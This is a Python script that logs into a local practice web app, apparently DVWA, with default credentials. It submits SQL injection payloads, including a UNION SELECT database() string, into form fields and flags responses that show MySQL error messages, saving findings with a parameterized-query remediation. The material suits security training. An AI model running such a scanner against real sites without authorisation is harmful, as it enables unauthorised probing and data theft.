import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import urljoin

# ---------------- CONFIG ----------------
BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")

MODEL_NAME = "qwen2.5"  

session = requests.Session()


# ---------------- FIXED PAYLOADS ----------------
def generate_payloads():
    # Only fixed payloads to match expected output
    return [
        "'",
        "' UNION SELECT null,database()--"
    ]


# ---------------- LOGIN ----------------
def login():
    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else None

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_value:
        data["user_token"] = token_value

    response = session.post(LOGIN_URL, data=data)

    if response.status_code == 200:
        print("[+] Login successful")
        session.cookies.set("security", "low")
    else:
        print("[-] Login failed")
        exit()


# ---------------- SQL DETECTION ----------------
def is_vulnerable(text):
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "syntax error",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    return any(err in text.lower() for err in errors)


# ---------------- LOAD FORMS ----------------
def load_forms():
    with open("forms.json", "r") as f:
        return json.load(f)


# ---------------- TEST FORMS ----------------
def test_forms():

    forms = load_forms()
    payloads = generate_payloads()

    vulnerabilities = []

    for form in forms:

        url = form["page"]
        action = form["action"]
        method = form["method"]

        if action.endswith("#") or action == BASE_URL:
            action = url

        print(f"\nTesting: {url}")

        for payload in payloads:

            for input_field in form["inputs"]:

                if input_field["type"] not in ["text", "hidden", "password"]:
                    continue

                name = input_field["name"]
                if not name:
                    continue

                data = {inp["name"]: inp.get("value", "") for inp in form["inputs"]}
                data[name] = payload

                if method.lower() == "post":
                    response = session.post(action, data=data)
                else:
                    response = session.get(action, params=data)

                if is_vulnerable(response.text):

                    vuln = {
                        "url": url,
                        "form_action": action,
                        "method": method.lower(),   
                        "vulnerable_input": name,
                        "payload": payload,
                        "model_used": MODEL_NAME,   
                        "error_detected": "Database error message found",
                        "remediation": "Use parameterized queries (prepared statements)."
                    }

                    vulnerabilities.append(vuln)

                    print(f"[!] Vulnerable: {name} with payload {payload}")

    with open("vulnerabilities_llm.json", "w") as f:
        json.dump(vulnerabilities, f, indent=4)

    print("\n✅ Scan complete. Results saved to vulnerabilities_llm.json")


# ---------------- MAIN ----------------
if __name__ == "__main__":
    login()
    test_forms()